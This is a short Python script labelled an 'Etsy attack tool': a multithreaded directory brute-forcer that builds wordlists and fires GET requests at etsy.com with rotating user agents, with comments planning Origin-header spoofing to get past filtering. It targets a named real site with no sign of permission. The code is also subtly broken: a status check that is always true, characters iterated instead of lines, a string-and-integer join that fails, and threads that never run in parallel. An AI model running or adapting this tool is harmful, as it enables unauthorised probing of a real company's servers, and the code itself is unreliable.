#imports first
import time
import threading
import urllib3
import certifi
from queue import Queue
import argparse
#define argparse argument for threads
parser = argparse.ArgumentParser(description='Etsy attack tool')
parser.add_argument("-t", "threadsN", type=int,
                    help='number for thread count')
args = parser.parse_args()
#define variables
http = urllib3.PoolManager(ca_certs=certifi.where())
words = Queue(maxsize=0)
url = "https://www.etsy.com/"
threads = args.threadsN
assetFuzz = "./assetsnoteslist.txt"
wordlistBase3 = "./actionwords.txt"
wordlistBase1 = "./massivewordlist.txt"
directories1 = "./directories.txt"
resume = None
#user agent randomized per request
#Origin header to cycle through proxy IP, localhost IP, and target ip range.

#define our functions
#function 1 wordlist definition/generator
def wordlist_builder(wordlistBase1, wordlistBase3, directories1):
    wf1 = open(wordlistBase3, "r")
    wf = open(wordlistBase1, "r")
    wf2 = open(directories1, "r")
    baseWords = wf.readline()
    actionWords = wf1.readlines()
    directories = wf2.readlines()
    for i in baseWords:
        words.put(i)
    wf.close()
    for i in actionWords:
        words.put(i)
        final = "_"+i+"/"
        words.put(final)
    wf1.close()
    for i in directories:
        words.put(i)
    wf2.close()
    return words


attack_field = wordlist_builder(wordlistBase1, wordlistBase3, directories1)
headers = open("./useragents.txt", 'r')


def directoryBust(arg):
    attacks = []
    while not attack_field.empty():
        trying = attack_field.get()
        for i in trying:
            if i not in attacks:
                attacks.append(i)
    for attempts in attacks:
            for header in headers:
                try:
                    r = http.request("GET",url+attempts,headers={"User-Agent":header}, retries=False)
                    if r.status == 200 or 302 or 403 or 500:
                        print("found"+r.status+r.url)
                except urllib3.exceptions.NewConnectionError:
                    print()
                time.sleep(2)
    pass

#function 3 iteration and threading
for i in range(threads):
    t = threading.Thread(target=directoryBust(attack_field))
    t.start()
    time.sleep(2)
